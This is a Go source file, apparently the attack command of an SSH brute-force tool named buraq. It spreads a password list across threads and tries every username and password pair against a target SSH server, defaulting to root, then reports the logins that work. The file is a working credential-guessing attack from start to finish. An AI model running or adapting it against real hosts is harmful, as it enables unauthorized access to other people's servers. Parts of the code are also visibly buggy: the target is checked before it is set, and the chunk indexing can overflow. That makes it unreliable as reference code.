package main

/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/NovusEdge/buraq
//
// Copyright: GNU General Public License v3.0
// See the LICENSE file for more info.
//
// All Rights Reserved
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	buraqlib "github.com/NovusEdge/buraq/buraqlib"
	src "github.com/NovusEdge/buraq/src"
)

var port, threads uint
var timeout time.Duration
var user, userlist, passlist string
var target string
var verbose bool

var validCreds = make(chan sshCredentials)

func main() {
	init_flags()

	startTime := time.Now()
	var wg sync.WaitGroup

	users := parseUsernames(userlist)
	users = append(users, user)

	passwords := parsePasswords(passlist)

	passChunkCounter := uint(0)

	for i := uint(0); i < threads; i++ {
		wg.Add(1)
		var atkcnfg = attackConfig{
			target,
			uint16(port),
			uint16(threads),
			users,
			passwords[passChunkCounter],
			timeout,
		}

		go worker(atkcnfg, &wg)
		if passChunkCounter < threads {
			passChunkCounter++
		} else {
			passChunkCounter = 0
		}
	}
	wg.Wait()

	timeTaken := time.Since(startTime)

	close(validCreds)
	if verbose {
		for cred := range validCreds {
			buraqlib.PrintInfo(fmt.Sprintf("Found valid credentials: %s:%s", cred.username, cred.password))
		}
	}

	buraqlib.PrintInfo(fmt.Sprintf("Process completed in: %v", timeTaken))
}

func init_flags() {
	var tout uint64

	flag.Usage = func() {
		fmt.Println(src.CommandAttackHelp)
	}

	if len(os.Args) < 2 {
		buraqlib.PrintInfo("No options provided!\nRun 'buraq help attack' for usage information.")
		os.Exit(0)
	}

	flag.UintVar(&port, "p", 22, "Specify the port for the target ssh service running.")
	flag.UintVar(&threads, "t", 32, "Specify the number of threads the program should use.")

	flag.StringVar(&user, "u", "root", "Specify the username to be used for the attack")

	var HOME = buraqlib.GetHomeDirectory()
	flag.StringVar(&passlist, "passlist", HOME+"/.buraq/default_passlist.txt", "Specify the list of passwords to use.")
	flag.StringVar(&userlist, "userlist", "", "Specify the list of usernames (if any) to use.")

	flag.Uint64Var(&tout, "timeout", 2000, "Specify the timeout for each attempt in milliseconds")

	flag.BoolVar(&verbose, "verbose", false, "Specify if the program should print verbose messages about it's tasks")

	flag.Parse()

	// flag checks:
	if port > 65535 {
		buraqlib.PrintError("Invalid port")
		os.Exit(1)
	}
	check_target()
	if _, err := os.Stat(passlist); os.IsNotExist(err) {
		buraqlib.PrintError(fmt.Sprintf("File %s does not exist\n", passlist))
		os.Exit(1)
	}

	if _, err := os.Stat(userlist); os.IsNotExist(err) && userlist != "" {
		buraqlib.PrintError(fmt.Sprintf("File %s does not exist\n", userlist))
		os.Exit(1)
	}

	timeout = time.Duration(tout) * time.Millisecond
	target = os.Args[len(os.Args)-1]
}

func check_target() {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), timeout)
	defer conn.Close()

	if err != nil {
		buraqlib.PrintError(fmt.Sprintf("{}", err))
		os.Exit(1)
	}
}

type sshCredentials struct {
	username string
	password string
}

type attackConfig struct {
	host      string
	port      uint16
	threads   uint16
	users     []string
	passwords []string
	timeout   time.Duration
}

func worker(a attackConfig, wg *sync.WaitGroup) {
	defer wg.Done()
	for _, user := range a.users {
		for _, password := range a.passwords {
			if verbose {
				buraqlib.PrintInfo(fmt.Sprintf("Trying: %s:%s", user, password))
			}
			ok, _ := src.SSHConnect(user, a.host, password, a.port, a.timeout)
			if ok {
				buraqlib.PrintSuccess(fmt.Sprintf("Successful login with credentials [u]: %s\t[p]: %s", user, password))
				validCreds <- sshCredentials{username: user, password: password}
				break
			}
		}
	}
}

func parsePasswords(plist string) [][]string {
	data, err := ioutil.ReadFile(plist)
	if err != nil {
		buraqlib.PrintError(fmt.Sprintf("{}", err))
		os.Exit(1)
	}

	passwords := strings.Split(string(data), "\n")
	passLen := uint(len(passwords))

	if passLen < threads {
		return [][]string{passwords}
	}

	chunkSize := (passLen + threads - 1) / threads

	chunks := make([][]string, 0)

	for i := uint(0); i < passLen; i += chunkSize {
		end := i + chunkSize

		if end > passLen {
			end = passLen
		}

		chunks = append(chunks, passwords[i:end])
	}

	return chunks
}

func parseUsernames(ulist string) []string {
	if ulist == "" {
		return []string{}
	}

	data, err := ioutil.ReadFile(ulist)
	if err != nil {
		buraqlib.PrintError(fmt.Sprintf("{}", err))
		os.Exit(1)
	}

	return strings.Split(string(data), "\n")

}
